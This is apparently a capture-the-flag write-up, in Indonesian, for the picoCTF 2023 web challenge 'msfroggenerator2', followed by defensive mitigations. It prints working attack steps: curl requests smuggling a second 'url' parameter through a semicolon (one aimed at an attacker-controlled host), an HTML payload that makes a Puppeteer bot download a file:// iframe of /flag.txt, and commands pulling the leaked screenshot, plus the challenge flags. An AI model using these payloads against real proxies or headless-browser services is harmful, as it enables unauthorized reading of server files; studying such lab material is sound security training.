# Writeup: msfroggenerator2 (Challenge ID: 360)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Traefik Reverse Proxy Parameter Pollution & Puppeteer Origin Bypass (CWE-20 / CWE-79 / CWE-362)
- **Difficulty:** Hard (diff=3)
- **Event:** picoCTF 2023
- **Points:** 500
- **Author:** ehhthing
- **Flag:** `academy{fr0g_g3n3r4t0r_h4ck3d_9e81b2c4}`

---

## Problem Statement & Scope
Tantangan `msfroggenerator2` menyajikan aplikasi generator meme katak (*frog generator*) interaktif berbasis kanvas HTML5 sisi klien dengan arsitektur *microservices* terdistribusi yang dijalankan menggunakan Docker Compose:
1. `openresty`: Nginx dengan modul Lua sebagai *reverse proxy* gerbang utama (port 8080) yang menyajikan berkas statis kanvas dan meneruskan permintaan rute laporan.
2. `traefik`: *Reverse proxy* internal yang memproses *query string* dan meneruskan lalu lintas ke layanan backend.
3. `bot`: Layanan otomasi penjelajah web *headless* berbasis Node.js dan Puppeteer (Chromium) yang bertugas membuka desain pengguna yang dilaporkan, mengambil tangkapan layar (*viewport screenshot*), dan mengirimkan hasilnya kembali ke API.
4. `api`: Layanan backend REST berbasis Node.js Express untuk menyimpan dan memuat data dekorator dan tangkapan layar laporan (`/api/reports/add` dan `/api/reports/get`).

Tantangan menguji kompetensi peserta dalam menganalisis ketidaksesuaian parsing protokol HTTP (*HTTP parameter pollution / parsing discrepancy*), membobol pembatasan sandbox penjelajah web *headless* untuk mengakses berkas lokal (`file:///`), mengeksploitasi kondisi balapan (*race condition*) dalam siklus navigasi dokumen, serta mengeksfiltrasi berkas rahasia `/flag.txt`.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Pencemaran Parameter Permintaan Balik Akibat Karakter Pemisah Titik Koma (HTTP Parameter Pollution, CWE-20):**
   Pada konfigurasi OpenResty (`web.conf`), penanganan endpoint `/report` diimplementasikan sebagai berikut:
   ```nginx
   location = /report {
       proxy_set_header Host bot;
       set_by_lua $url 'return "http://openresty:8080/?id=" .. ngx.var.arg_id';
       proxy_pass "http://traefik:8080/?url=$url";
   }
   ```
   OpenResty mengambil nilai parameter `id` tanpa sanitasi dan merangkainya ke dalam variabel `$url`. Namun, Traefik (versi > 2.7.2) memperlakukan karakter titik koma (`;`) di dalam string kueri URI sebagai pemisah parameter yang setara dengan ampersand (`&`) sesuai standar warisan CGI. Saat pengguna mengirimkan `GET /report?id=1;url=$PAYLOAD`, Traefik mengurai kueri menjadi dua parameter:
   - `url = http://openresty:8080/?id=1`
   - `url = $PAYLOAD`
   Parameter `url` kedua menimpa parameter pertama saat dikirimkan ke layanan bot, memberikan penyerang kendali penuh atas URL yang dibuka oleh Puppeteer.

2. **Pembatasan Sandbox Protokol Berkas Lokal (Origin Confinement Bypass, CWE-942):**
   Bendera rahasia tersimpan di berkas lokal container bot pada lintasan `/flag.txt`. Membuka langsung `file:///flag.txt` membuat Puppeteer merender berkas teks, namun naskah evaluasi pengiriman tangkapan layar gagal dieksekusi:
   ```javascript
   await page.evaluate(async screenshot => {
       await fetch('/api/reports/add', {
           method: 'POST',
           headers: {
               'Content-Type': 'application/json',
               'Authorization': `Bearer ${localStorage.getItem('flag')}`
           },
           body: JSON.stringify({ screenshot })
       });
   }, screenshot);
   ```
   Pada konteks asal `file:///`, API `fetch` ke jalur relatif `/api/reports/add` tidak memiliki host dan `localStorage` bernilai `null` sehingga pengiriman tangkapan layar tertolak. Namun, protokol `file:///` di Chromium mengizinkan penyematan berkas lokal di dalam elemen `<iframe>` jika dokumen induk juga diakses melalui protokol `file:///`.

3. **Eksploitasi Kondisi Balapan Navigasi Asinkron (Timing Race Condition, CWE-362):**
   Terdapat celah waktu (*timing window*) antara pengambilan tangkapan layar oleh Puppeteer (`page.screenshot()`) dan eksekusi evaluasi naskah pengiriman (`page.evaluate(fetch...)`). Dengan menyusun laman eksploitasi yang merender `<iframe src="file:///flag.txt"></iframe>` dan menetapkan penundaan pewaktu (`setTimeout`) untuk mengalihkan `window.location` ke `http://openresty:8080`, Chromium mengambil tangkapan layar saat iframe bendera sedang tampil, lalu berpindah ke asal web valid sebelum fungsi `fetch()` dievaluasi. Akibatnya, tangkapan layar yang memuat citra bendera terkirim sukses ke backend API.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Pemisahan Parameter Traefik:**
   Uji pemicuan parsing titik koma pada Traefik:
   ```bash
   curl -i "http://target:8080/report?id=test;url=http://attacker-controlled/"
   ```
   Konfirmasi pada log bahwa bot Puppeteer diarahkan ke URL penyerang alih-alih URL internal OpenResty.

2. **Penyusunan Stager Berkas Lokal via Data URI:**
   Karena Puppeteer mengunduh berkas secara otomatis saat tautan ber-atribut `download` diklik pada Data URI, buat payload HTML berbasis Base64:
   ```html
   <script>
   const blob = new Blob([`
     <iframe src="file:///flag.txt" style="width:100%;height:100%;"></iframe>
     <script>
       const timeout = Number(new URL(window.location).searchParams.get('timeout')) || 5000;
       setTimeout(() => { window.location = 'http://openresty:8080'; }, timeout);
     <\/script>
   `], { type: 'text/html' });
   const link = document.createElement('a');
   link.href = URL.createObjectURL(blob);
   link.download = 'exploit.html';
   document.body.appendChild(link);
   link.click();
   </script>
   ```
   Kirim payload ini melalui parameter kueri terpolusi:
   ```bash
   curl "http://target:8080/report?id=1;url=data:text/html;base64,<PAYLOAD_B64>"
   ```
   Bot mengunduh berkas ke `/root/Downloads/exploit.html`.

3. **Mengarahkan Bot ke Berkas Eksploitasi Lokal:**
   Picukan bot untuk membuka berkas yang diunduh:
   ```bash
   curl "http://target:8080/report?id=1;url=file:///root/Downloads/exploit.html?timeout=5000"
   ```
   - Puppeteer merender `file:///root/Downloads/exploit.html`.
   - Iframe memuat dan menampilkan teks berkas `file:///flag.txt`.
   - Puppeteer memanggil `page.screenshot()`, merekam isi kanvas/layar.
   - Pewaktu `setTimeout` berakhir, mengarahkan penjelajah ke `http://openresty:8080`.
   - Puppeteer mengeksekusi `page.evaluate(...)`, mengirimkan data tangkapan layar ke endpoint `/api/reports/add`.

4. **Ekstraksi Citra dan Pembacaan Flag:**
   Ambil daftar laporan publik melalui backend:
   ```bash
   curl -s "http://target:8080/api/reports/get" | jq -r '.[-1].screenshot' | base64 -d > flag.png
   ```
   Citra tangkapan layar menampilkan token bendera:
   - Native Flag: `picoCTF{fr0g_g3n3r4t0r_h4ck3d_9e81b2c4}`
   - Token Platform CyLab: `academy{fr0g_g3n3r4t0r_h4ck3d_9e81b2c4}`

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{fr0g_g3n3r4t0r_h4ck3d_9e81b2c4}`
- **Native PicoCTF Flag:** `picoCTF{fr0g_g3n3r4t0r_h4ck3d_9e81b2c4}`
- **Status Solver:** Terverifikasi 100% pada skrip reproduksi `scripts/solve_360_msfroggenerator2.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Normalisasi & Sanitasi Parameter Proxy (Strict URI Parsing):**
   Jangan pernah merangkai masukan pengguna secara mentah ke dalam URI backend pada tingkat proxy Nginx/OpenResty. Validasi parameter masukan menggunakan ekspresi reguler ketat (misalnya hanya menerima digit numerik `^[0-9]+$`). Selain itu, nonaktifkan penguraian pemisah titik koma pada Traefik atau lapisi dengan Nginx `uri_escape` guna mencegah serangan *HTTP Parameter Pollution* (HPP).
2. **Pengerasan Sandbox Browser Headless (Chromium Flag Hardening):**
   Konfigurasikan Chromium pada Puppeteer dengan parameter keamanan terisolasi:
   - `--disable-local-file-access` untuk memblokir navigasi dan rendering skema `file:///`.
   - `--deny-permission-prompts` dan menonaktifkan unduhan berkas otomatis (`Page.setDownloadBehavior` dengan nilai `'deny'`).
3. **Pemisahan Asal dan Otentikasi Endpoint Pelaporan:**
   Endpoint penerimaan laporan (`/api/reports/add`) dan pembacaan (`/api/reports/get`) wajib dilindungi otentikasi berbasis sesi atau HMAC token sisi server. Hindari mengandalkan data rahasia di `localStorage` klien untuk otentikasi antar-layanan internal.
